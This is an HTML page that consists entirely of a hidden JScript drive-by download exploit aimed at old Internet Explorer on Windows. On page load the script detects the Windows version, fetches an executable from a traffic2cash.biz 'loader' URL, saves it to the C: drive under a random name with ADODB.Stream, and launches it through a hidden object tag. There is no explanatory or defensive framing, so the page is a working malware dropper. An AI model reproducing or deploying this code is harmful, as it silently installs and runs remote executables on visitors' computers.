<html>
<head>
<title></title>
</head>
<body>
<DIV id="ObjectContainer"></DIV>
<IFRAME name="icounter" width=60 height=30 style="display:none"></IFRAME>

<script language="JScript">
   
   function Get_Win_Version()
   {
     var IEversion=navigator.appVersion;
     if (IEversion.indexOf('Windows 95') != -1) return "95"
     else if (IEversion.indexOf('Windows NT 4') != -1) return "NT"
     else if (IEversion.indexOf('Win 9x 4.9') != -1) return "ME"
     else if (IEversion.indexOf('Windows 98') != -1) return "98"
     else if (IEversion.indexOf('Windows NT 5.0') != -1) return "2K"
     else if (IEversion.indexOf('Windows NT 5.1') != -1) return "XP"
   }
   
   function LaunchExecutable9X(InetPath)
   {
     tagstyle='style="display:none"'; 
     ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
     ObjBASE='mhtml:file://C:\\ARCHIVE.MHT!'+InetPath;
     sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjBASE+'" '+tagstyle+'></object>';
     icounter.document.write(sObject);
     setTimeout('icounter.document.execCommand("Refresh")',1000);
 
   }
   
   function LaunchExecutable2K(ObjSrc)
   {
     tagstyle='style="display:none"'; 
     ObjCLSID="clsid:10000000-1000-0000-10000-000000000001";
     sObject ='<object classid="'+ObjCLSID+'" codebase="'+ObjSrc+'" '+tagstyle+'></object>';
     try
     {
         ObjectContainer.innerHTML=sObject;
     }
     catch(e){}  
   }

   ObjSrc="";
   
   for (ik=0;ik<8;ik++)
   {
       ii=Math.random();
       chCode=Math.round(ii*25)+0x61;
       chSym=String.fromCharCode(chCode)
       ObjSrc=ObjSrc+chSym;
       if (chCode==0x61) {break};
   }

   ObjSrc="C:\\"+ObjSrc+".exe";
 
   var InetPath="http://traffic2cash.biz/web2.php?account=adv335&loader=loader6";
   var WinOS=Get_Win_Version();
   
   if ((WinOS=="95")||(WinOS=="98"))
   {
      LaunchExecutable9X(InetPath);
   }
   else
   {
   var oXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); 
   oXMLHTTP.Open("GET",InetPath,0); 
   oXMLHTTP.Send();   

   try
   {
      var oStream = new ActiveXObject('ADODB.Stream'); 
      oStream.Mode = 3; 
      oStream.Type = 1; 
      oStream.Open(); 
      oStream.Write(oXMLHTTP.responseBody); 
      oStream.SaveToFile(ObjSrc,2);
   }
   catch(e){}

   setTimeout("LaunchExecutable2K(ObjSrc)",1000);
   }
</script>

</body>
</html>